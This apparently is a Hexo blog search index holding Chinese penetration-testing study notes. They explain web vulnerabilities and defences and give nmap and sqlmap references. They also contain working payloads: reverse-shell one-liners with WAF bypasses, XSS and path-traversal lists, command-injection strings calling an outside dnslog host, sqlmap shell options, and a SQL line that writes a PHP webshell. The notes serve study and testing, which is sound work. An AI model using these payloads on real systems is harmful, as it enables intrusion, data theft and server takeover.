<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[渗透测试相关]]></title>
    <url>%2Fnote%2F2020%2Fundefined30%2F6a2e2a4a.html</url>
    <content type="text"><![CDATA[渗透测试基本流程1.信息收集 服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等） 网站指纹识别（包括，cms，cdn，证书等），dns记录 whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等） 子域名收集，旁站查询(有授权可渗透)，C段等 google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等 扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等 传输协议，通用漏洞，exp，github源码等 2.漏洞挖掘 XSS，SQL注入，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，使用漏扫工具等 3.漏洞利用|提权 mysql提权，linux系统提权 4.编写报告|清除测试数据 5.漏洞复测 sqlmap的运行机理 尝试连接目标网站 确认目标网站是否为动态网页 通过报错确认数据库的类型 添加payload进行测试 测试出注入类型后会对数据库版本进行猜测 最后的出结论 .htaccess利用 htaccess是超文本访问（Hypertext Access）的缩写，是一个基于Apache的Web服务器使用的配置文件，用于控制它所在的目录以及该目录下的所有子目录。 .htaccess文件的主要功能包括使用密码保护文件夹，禁止或允许用户使用IP地址访问，禁止目录浏览，将用户自动重定向到另一个页面或目录，创建和使用自定义错误页面，改变具有特定扩展名的文件的使用方式，或者通过指定文件扩展名或特定文件作为主页。 用连续的弹出图片骚扰用户 可以上传图片马，将jpg文件解析为php文件 sql注入原理及防御原理 ： 当网站在向后台数据库传递SQL语句进行数据库操作时。如果对用户输入的参数没有经过严格的过滤处理，那么恶意访问者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。 防御： 关闭错误提示，php.ini中的display_errors=Off 魔术引号当php.ini里的magic_quotes_gpc=On时。提交的变量中所有的单引号（’）、双引号（”）、反斜线（/）与 NUL（NULL 字符）会自动转为含有反斜线的转义字符。 通过使用参数化查询和对象关系映射(Object Relational Mappers，ORM)，来避免和修复注入漏洞。此类查询通过指定参数的占位符，以便数据库始终将它们视为数据，而非SQL命令的一部分。 使用转义字符 命令执行命令执行漏洞原理：应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。 命令执行漏洞利用条件： 应用调用执行系统命令的函数 将用户输入作为系统命令的参数拼接到了命令行中 没有对用户输入进行过滤或过滤不严漏洞分类： 代码层过滤不严 商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：system(“/bin/program –arg $arg”); 系统的漏洞造成命令注入 bash破壳漏洞（CVE-2014-6271） 调用的第三方组件存在代码执行漏洞 如wordPress中用来处理图片的imageMagick组件JAVA中的命令执行漏洞（struts2/ElasticsearchGroovy等）ThinkPHP命令执行 漏洞危害： 继承Web服务程序的权限去执行系统命令或读写文件 反弹shell 控制整个网站甚至服务器 进一步内网渗透 命令拼接符|、||、&amp;、&amp;&amp;的区别：&amp;：无论左边是false还是true，右边都执行&amp;&amp;：具有短路效果，左边是false，右边不执行。|:无论左边是false还是true，右边都会执行||：具有短路效果，左边是true，右边不执行。 代码执行： 利用系统函数实现命令执行，在php下，允许命令执行的函数有：eval（）、assert（）、preg_replace（）、call_user_func（）如果页面中存在这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞 其他函数ob_start（）、unserialize（）、creat_function（）、usort（）、uasort（）、uksort（）、array_filter（）、array_reduce（）、array_map（）…… 系统命令执行漏洞 system（） exec（） shell_exec（） passthru（） pcntl_exec（） popen（） proc_open（） 反引号…… 命令执行WAF绕过技巧 技巧一：通配符ls-l使用通配符/?in/?s-l /???/??t /??c/p???w?有时候WAF不允许使用太多的？号/?in/cat/?tc/p?sswd NC反弹shell:nc -e /bin/bash 127.0.0.1 3737为了避免符号，可以将IP地址转换成整型。127.0.0.1-&gt;2130706433 使用通配符root@kali:~#/??n/?c -e/??n/b??h 2130706433 3737 技巧二：连接符 技巧三：未初始化的bash变量在bash环境中允许我们使用未初始化的bash变量，如何$a ,$b,$c我们事先并没有定义它们，输出看看:root@kali:~# echo $aroot@kali:~# echo $broot@kali:~# echo $croot@kali:~#未初始化的变量值都是null 读取/etc/passwd:cat$a /etc$a/passwd$a 测试WAF测试代码：&lt;?phpecho “OK”;system(‘dig’.$_GET[‘host’]);?&gt; www.baidu.com;$s/bin$s/which$s nc$s反弹shell:/bin$s/nc$s -e/bin$s/bash$s 2130706433 3737 漏洞修复： 尽量少用执行命令的函数或者直接禁用 参数值尽量使用引号包括 在使用动态函数之前，确保使用的函数是指定的函数之一 在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义 对PHP语言来说，不能完全控制的危险函数最好不要使用 XSS漏洞​ 恶意攻击者往Web页面里插入恶意javaScript代码，当用户浏览该页之时，嵌入其中Web里面的javaScript代码会被执行，从而达到恶意攻击用户的目的。 反射型XSS：攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。 存储型XSS：代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie。 DOM性XSS：DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。 防御： 进行输入检查，限制输入允许的字符，让特殊字符的攻击失效。XSS Filter 开启HttpOnly，解决xss后的cookie劫持问题 进行输出过滤，所有需要输出到页面的元素全部通过HTMLEncode CSRFCSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。 防御： 同源检测 禁止不受信任的域名对我们发起请求。 Origin Header Referer Header CSRF Token a. 将CSRF Token输出到页面中 b. 页面提交的请求携带这个Token c. 服务器验证Token是否正确 双重cookie验证 在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如csrfcookie=v8g9e4ksfhw）。 在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw）。 后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。 任何跨域都会导致前端无法获取Cookie中的字段（包括子域名之间） Samesite Cookie 属性 SSRF通常用于控制web进而探测内网服务以及拥挤内网脆弱应用 SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。 利用： file协议查看文件 dict协议探测端口 gopher协力支持get&amp;post请求 防御： 限制协议为HTTP，HTTPS 设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP） 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 文件上传漏洞程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。 造成文件上传漏洞的原因有： 开源编辑器的上传漏洞 服务器配置不当 本地文件上传限制被绕过 过滤不严或被绕过 文件解析漏洞导致文件执行 文件路径截断 绕过： %00 截断绕过 文件名绕过 大小写绕过 php2 php3 php5 phtml Content-Type绕过 前端js绕过 Content-Type绕过 前端绕过 文件解析规则绕过 Windows环境特性绕过 文件名大小写绕过 双写绕过 点空格绕过 文件头绕过 条件竞争绕过 防御 将文件上传的目录设置为不可执行 判断文件类型，结合使用MIME Type，后最检查等方式，推荐使用白名单方式 使用随机数改写文件名和文件路径。 常用web漏洞测试的payload整理[反射型xss] [在html形成] 123&quot;&apos;&gt;&lt;script&gt;document.title=&quot;[random]&quot;;&lt;/script&gt;&lt;script&gt;document.title=&quot;[random]&quot;;&lt;/script&gt;&lt;svg οnlοad=document.title=&quot;[random]&quot;;&gt; [在js形成] 123456document.title=&quot;[random]&quot;;//;document.title=&quot;[random]&quot;;//&quot;;document.title=&quot;[random]&quot;;&apos;;document.title=&quot;[random]&quot;;&quot;);document.title=&quot;[random]&quot;;&apos;);document.title=&quot;[random]&quot;; [在html属性形成(img)] 123888&quot; οnlοad=document.title=&quot;[random]&quot; a=&quot;888&apos; οnlοad=document.title=&quot;[random]&quot; a=&apos;888 οnlοad=document.title=&quot;[random]&quot; [存储型xss] [通用payload]测试环境，需要在触发的地方查看payload显示情况1234567891011121314151617181920&lt;script&gt;alert(/StoredXssByScriptTag/);&lt;/script&gt;&quot;&apos;&gt;&lt;script&gt;alert(/StoredXssByScriptTagBypass);&lt;/script&gt;[Bypass on Event] [事件型绕过]&lt;img src=1 οnerrοr=alert(/StoredXssByImgTag/)&gt; #一般富文本不会过滤img标签[Bypass pseudo protocol] [伪协议绕过]&lt;iframe src=javascript:prompt(/StoredXssByIframeTag/);&gt;&lt;/iframe&gt;&lt;object data=data:text/html;base64,PHNjcmlwdD5wcm9tcHQoL1N0b3JlZFhzc0J5T2JqZWN0VGFnLyk7PC9zY3JpcHQ+&gt;&lt;/object&gt;[Bypass html5 tag] [html5标签绕过]&lt;svg οnlοad=prompt(/StoredXssBySvgTag/)&gt;&lt;embed src=javascript:alert(/StoredXssByEmbedTag/);&gt;[Bypass html or js encode] [js编码，html编码，十进制编码绕过等]&lt;embed src=javas&amp;#99;r&amp;#105;pt:alert(/StoredXssByEmbedTagAndHtmlEncode/);&gt;&lt;video&gt;&lt;source οnerrοr=alert(String.fromCharCode(47,83,116,111,114,101,100,88,115,115,98,121,86,105,100,101,111,84,97,103,65,110,100,83,116,114,105,110,103,69,110,99,111,100,101,47))&gt;&lt;script/src=data:text/j\141v\141script,\u0061%6C%65%72%74(/StoredXssbyScriptTagAndJSEncode/)&gt;&lt;/script&gt;如果进行盲测可以根据xss平台地址替换相应的js触发代码&quot;&gt;&lt;script src=http://myxss.net/xxxxxx&gt;&lt;/script&gt; [静态文件读取] [常规检测] 123/../../../../../../../../../../../etc/passwd/../../../../../../../../../../../etc/hosts /../../../../../../../C:/Windows/system.ini [windows] [伪造绕过]123456/././././././././././././././././././././././././../../../../../../etc/passwd /..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts [后缀绕过] 1234567891011/../../../../../../../../../../../etc/passwd#/../../../../../../../../../../../etc/passwd%00/../../../../../../../../../../../etc/passwd#.jpg/../../../../../../../../../../../etc/passwd%00.jpg/../../../../../../../../../../../etc/passwd#.html/../../../../../../../../../../../etc/passwd%00.html/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.jpg/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.html/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.jpg/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.html [命令执行漏洞] [常规检测] 1234;curl [random].test.dnslog.link | curl [random].test.dnslog.link | ping -n 2 [random].test.dnslog.link [Windows] | ping -c 2 [random].test.dnslog.link [Linux] [绕过检测] 123456789101112;curl [random].test.dnslog.link# | curl [random].test.dnslog.link#%20|%20curl%20[random].test.dnslog.link%20|%20curl%20[random].test.dnslog.link#%20|%20ping%20-n%202%20[random].test.dnslog.link%20|%20ping%20-c%202%20[random].test.dnslog.link#a=p;b=ing;c=c;d=2;$a$b -$c $d [random].test.dnslog.linka=c;b=url;$a$b [random].test.dnslog.link#$&#123;IFS&#125;|$&#123;IFS&#125;curl$&#123;IFS&#125;[random].test.dnslog.link$&#123;IFS&#125;|$&#123;IFS&#125;ping$&#123;IFS&#125;-c$&#123;IFS&#125;2$&#123;IFS&#125;[random].test.dnslog.linka=p;b=ing;c=c;d=2;$a$b&#123;IFS&#125;-$c&#123;IFS&#125;$d&#123;IFS&#125;[random].test.dnslog.linka=c;b=url;$a$b&#123;IFS&#125;[random].test.dnslog.link# [ssrf漏洞]1http://[random].test.dnslog.link/ [strust2命令执行]1?redirect:http://[random].test.dnslog.link/%25&#123;3*4&#125;]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Interview</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nmap常用参数]]></title>
    <url>%2Fnote%2F2020%2Fundefined30%2F868037e0.html</url>
    <content type="text"><![CDATA[nmap 语法结构：nmap [Scan Type(s)] [Options] {target specification} 端口状态介绍 open：确定端口开放，可达 closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。 filtered ：由于包过滤阻止探测报文到达端口，Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。 unfiltered ：未被过滤状态意味着端口可访问，但是Nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。 open | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。 closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的 扫描目标格式 示例： scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL:从文件中加载目标 -iR:随机扫描 –exclude :排除网段或主机地址 –excledefile:排除文件中的地址 主机发现 -sL:列出需要扫描的目标，不扫描 -sn:只做ping扫描，不做端口扫描 -Pn：跳过主机发现，视所有主机都在线 -PS/PA/PU/PY[portlist]：基于TCP（SYN、ACK）、UDP、SCTP的指定端口的主机发现 -PE/PP/PM：基于ICMP的echo、timestamp、network request的主机发现 -PO[Protocol list]：基于IP协议字段的ping扫描 -n/-R: -n表示不对目标最DNS解析，-R表示进行DNS解析，缺省为必要时候进行DNS解析 –dns-servers &lt;serv1[,serv2],…&gt;: 指定DNS 服务器 –system-dns:调用系统的DNS服务器 –traceroute：显示追踪到目标的路径 扫描技术 -sS/sT/sA/sW/sM:TCP扫描 S是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放 T是全连接扫描会和服务器建立完整的三次握手，效率低 A发送ACK报文，通过服务器响应来判断是否开放，有的服务器不开会回复ICMP端口不可达，当回复RST时表示可能被拦截或者端口开放，不是一个准确的判断条件 W 是窗口扫描，发出的报文和ACK一样，利用的是在某些系统中如果端口开放，收到ACK包后会响应一个窗口非0的RST包 M是Maimon扫描，使用发现者的名字命名。其原理是向目标服务器发送FIN/ACK 报文，在某些系统中如果端口开放则会丢弃该报文不做响应，如果端口关闭则回复RST或者ICMP，Nmap可借此判断服务器端口的开放情况。不准 -sU：UDP扫描，某些系统如果UDP端口不开放会回复ICMP差错报文（这也是Linux系统中traceroute的实现原理）。Nmap UDP端口扫描的强大之处在于它会针对知名端口构造初始交互报文，比如会针对UDP 500构造一个主模式协商的IKE报文 -sN/sF/sX:特定TCP标志位的扫描，N是空标志位；F是FIN置位；X是Xmas扫描将FIN、PSH、URG同时置位。收到RST说明端口关闭，无响应说明被过滤或者端口开放，不准。 –scanflags ：实现上同上面几种类似，可以让用户自定义TCP标志位。 -sI : Idle扫描需要一台没有流量的僵尸主机，这种扫描的实现原理是在一定的时间里，同一台主机发出的IP数据报文其ip头中的identification字段是累加的。探测分为3步：1、Nmap主机向僵尸机发包，通过僵尸机的响应包探测其ID；2、Nmap主机伪造僵尸机源地址向服务器的特定端口发送SYN包；3、Nmap主机再次探测僵尸机的ip.id。如果目标服务器端口开放，则必然会向僵尸机发送SYN/ACK，由于莫名其妙收到一个SYN/ACK 报文，僵尸机会向目标服务器发送RST报文，该报文的ip.id 是第一步+1，则第三步Nmap主机探测到的ip.id应该是第一步+2，说明目标主机端口开放。反之，如果目标主机端口未开放，则收到第二步的报文后会向僵尸机回复RST或者直接丢弃该报文不响应，无论哪种情况，都不会触发僵尸机发包，进而僵尸机的ip.id不会变化，第三步Nmap探测到的id应该是第一步+1. -sY/sZ:SCTP协议INIT或cookie-echo扫描 -sO:基于IP协议的扫描，通过变换IP报文头中的Protocol值来对服务器进行探测 -b :：FTP反弹扫描，借助FTP特性，通过FTP服务器连接想要扫描的主机实现隐身的目的 端口相关参数 -p:指定端口扫描范围，如：-p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 –exclude-ports : 排除端口 -F：扫描比缺省少的端口（缺省1000，加了-F100） -r：顺序扫描端口，缺省是随机分组扫描 –top-ports :按top排序扫描知名端口 –port-ratio : 按比例扫描知名端口，值在0-1之间，越小扫的越多 系统/版本探测 -sV:探测开放的端口的系统/服务信息 –version-intensity :设置版本检测的详程度级别，0-9，越高越详细 –version-light：输出最可能的版本信息，缺省是2 –version-all：使用所有的探测条件进行版本/系统探测 –version-trace:打印详细的版本扫描过程 脚本扫描 –script=:指定脚本名称 –script-args=&lt;n1=v1,[n2=v2,…]&gt;:为脚本指定参数 –script-help=: 查看脚本帮助信息 –script-updatedb:更新脚本数据库 系统探测 -O:激活系统探测 –osscan-limit:只对开放端口的有效主机进行系统探测 –osscan-guess：推测系统信息 其他 -T:时间模板，越大速度越快 -6：使能IPV6探测 -A：使能系统探测、版本检测、脚本扫描、路由追踪 -V：打印版本号 -v：增加输出的详细程度]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sqlmap常用参数]]></title>
    <url>%2Fnote%2F2020%2Fundefined30%2F519cc.html</url>
    <content type="text"><![CDATA[sqlmap -u #注入点 -f #指纹判别数据库类型 -b #获取数据库版本信息 -p #指定可测试的参数(?page=1&amp;id=2 -p “page,id”) -D “” #指定数据库名 -T “” #指定表名 -C “” #指定字段 -s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log” 恢复:-s “xx.log” –resume) –columns #列出字段- –current-user #获取当前用户名称 –current-db #获取当前数据库名称 –users #列数据库所有用户 –passwords #数据库用户所有密码 –privileges #查看用户权限(–privileges -U root) -U #指定数据库用户 –dbs #列出所有数据库 –tables -D “” #列出指定数据库中的表 –columns -T “user” -D “mysql” #列出mysql数据库中的user表的所有字段 –dump-all #列出所有数据库所有表 –exclude-sysdbs #只列出用户自己新建的数据库和表 –dump -T “” -D “” -C “” #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname) –dump -T “” -D “” –start 2 –top 4 # 列出指定数据库的表的2-4字段的数据–dbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) –os #指定系统(Linux,Windows) -v #详细的等级(0-6) 0：只显示Python的回溯，错误和关键消息。 1：显示信息和警告消息。 2：显示调试消息。 3：有效载荷注入。 4：显示HTTP请求。 5：显示HTTP响应头。 6：显示HTTP响应页面的内容 –privileges #查看权限 –is-dba #是否是数据库管理员 –roles #枚举数据库用户角色 –udf-inject #导入用户自定义函数（获取系统权限） –union-check #是否支持union 注入 –union-cols #union 查询表记录 –union-test #union 语句测试 –union-use #采用union 注入 –union-tech orderby #union配合order by –method “POST” –data “” #POST方式提交数据(–method “POST” –data “page=1&amp;id=2″) –cookie “用;号分开” #cookie注入(–cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) –referer “” #使用referer欺骗(–referer “http://www.baidu.com”) –user-agent “” #自定义user-agent –proxy “http://127.0.0.1:8118″ #代理注入 –string “” #指定关键词 –threads #采用多线程(–threads 3) –sql-shell #执行指定sql命令 –sql-query #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1″ ) –file-read #读取指定文件 –file-write #写入本地文件(–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) –file-dest #要写入的文件绝对路径 –os-cmd=id #执行系统命令 –os-shell #系统交互shell –os-pwn #反弹shell(–os-pwn –msf-path=/opt/framework/msf3/) –msf-path= #matesploit绝对路径(–msf-path=/opt/framework/msf3/) –os-smbrelay # –os-bof # –reg-read #读取win系统注册表 –priv-esc # –time-sec= #延迟设置 默认–time-sec=5 为5秒 -p “user-agent” –user-agent “sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)” #指定user-agent注入 –eta #盲注 1. 基础用法： ./sqlmap.py -u “注入地址” -v 1 –dbs // 列举数据库 ./sqlmap.py -u “注入地址” -v 1 –current-db // 当前数据库 ./sqlmap.py -u “注入地址” -v 1 –users // 列数据库用户 ./sqlmap.py -u “注入地址” -v 1 –current-user // 当前用户 ./sqlmap.py -u “注入地址” -v 1 –tables -D “数据库” // 列举数据库的表名 ./sqlmap.py -u “注入地址” -v 1 –columns -T “表名” -D “数据库” // 获取表的列名 ./sqlmap.py -u “注入地址” -v 1 –dump -C “字段,字段” -T “表名” -D “数据库” // 获取表中的数据，包含列已经开始拖库了，SQLMAP是非常人性化的，它会将获取的数据存储sqlmap/output/中 2. sqlmap post注入 在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。 浏览器打开目标地址http:// www.2cto.com /Login.asp 配置burp代理(127.0.0.1:8080)以拦截请求 点击login表单的submit按钮 如下图，这时候Burp会拦截到了我们的登录POST请求 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下 运行sqlmap并使用如下命令：./sqlmap.py -r search-test.txt -p tfUPass这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。 3. sqlmap cookies注入 sqlmap.py -u “http://127.0.0.1/base.php&quot; –cookies “id=1” –dbs –level 2 默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie时面的参数，当&gt;=3的时候将检查User-agent和Referer，那么这就很简单了，我们直接在原有的基础 上面加上 –level 2 即可利用sqlmap cookies注入突破用户登录继续注入先把用户登陆的cookie拿到吧，在收藏夹添加一个链接cookies属性：名字自己取javascript:alert(document.cookie)，，需要获取当前cookie的时候，直接点一下这个链接，然后复制一下弹出对话框里的cookie值就搞定了sqlmap.py -u http://x.x.x.x/Down.aspx?tid=2 -p tid –dbms mssql –cookie=”info=username=test”-p是指指定参数注入 4. sqlmap遇到url重写的注入 哪里存在注入就加上 号./sqlmap.py -u “http://www.cunlide.com/id1/1/id2/2” 5. sqlmap 编码绕waf注入在sqlmap 的 tamper目录下有很多space2morehash.py 编码脚本自行加载 ./sqlmap.py -u http://127.0.0.1/test.php?id=1 -v 3 –dbms “MySQL” –technique U -p id –batch –tamper “space2morehash.py” sqlmap读文件 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–file-read “/etc/passwd” sqlmap写文件 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–file-write /localhost/mm.php –file-dest/var/www/html/xx.php -v 2 sqlmap分段脱裤 sqlmap.py -u url -D “data” -T “tables” -C “username,password,email” –dump –threads=5 –start=1 –stop=5000其他基础： sqlmap -u “http://url/news?id=1&quot; –level=3 –smart –dbms “Mysql” –current-user #获取当前用户名称 sqlmap -u “http://www.xxoo.com/news?id=1&quot; –level=3 –smart –dbms “Mysql” –current-db #获取当前数据库名称 sqlmap -u “http://www.xxoo.com/news?id=1&quot; –level=3 –smart –dbms “Mysql”–tables -D “db_name” #列表名 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart –dbms “Mysql” –columns -T “tablename” users-D “db_name” -v 0 #列字段 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart –dbms “Mysql” –dump -C “column_name” -T “table_name” -D “db_name” -v 0 #获取字段内容 信息获取 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –users #列数据库用户 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dbs#列数据库 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–passwords #数据库用户密码 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–passwords-U root -v 0 #列出指定用户数据库密码 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dump-all -v 0 #列出所有数据库所有表 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–privileges #查看权限 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–privileges -U root #查看指定用户权限 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –is-dba -v 1 #是否是数据库管理员 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –roles #枚举数据库用户角色 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–udf-inject #导入用户自定义函数（获取系统权限！） sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–dump-all –exclude-sysdbs -v 0 #列出当前库所有表 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” - –union-check #是否支持union 注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–union-cols #union 查询表记录 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –union-test #union 语句测试 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –union-use –banner #采用union 注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–union-test –union-tech orderby #union 配合 order by sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–method “POST” – data “id=1&amp;cat=2” #post注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–cookie “COOKIE_VALUE” #cookie注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”-b #获取banner信息 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart-v 1 -f #指纹判别数据库类型 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart–proxy”http://127.0.0.1:8118&quot; #代理注入 sqlmap -u “http://url/news?id=1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot; #指定关键词 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–sql-shell #执行指定sql命令 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–os-cmd=whoami #执行系统命令 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–os-shell #系统交互shell sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–os-pwn #反弹shell sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–reg-read #读取win系统注册表 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dbs-o “sqlmap.log” #保存进度 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dbs -o “sqlmap.log” –resume #恢复已保存进度 ./sqlmap.py -u “http://www.91ri.org/ id1/1*/id2/2″“Show.asp” –cookie “id=9” –table –level 2–forms–data “data”–delay 0.5–safe-freq 25-v 3 –dbs –batch –tamper “base64encode.py”sqlmap.py -u url -D “data” -T “tables” -C “username,password,email” –dump-all -v 传统的sql语句写shell通过sql注入select into outfile实现，如： 11&apos; union select 1,&apos;&lt;?php eval($_POST[a]);?&gt;&apos; INTO OUTFILE &apos;/var/www/tmp/nb.php&apos;# dumpfile、file_put_contents outfile不能用了怎么办？select unhex(&#39;udf.dll hex code&#39;) into dumpfile &#39;c:/mysql/mysqlserver 5.1/lib/plugin/xxoo.dll&#39;;可以 UDF提权https://www.cnblogs.com/milantgh/p/5444398.html outfile适合导库，在行末会写入新行并转义，因此不能写入二进制可执行文件。 写shell条件 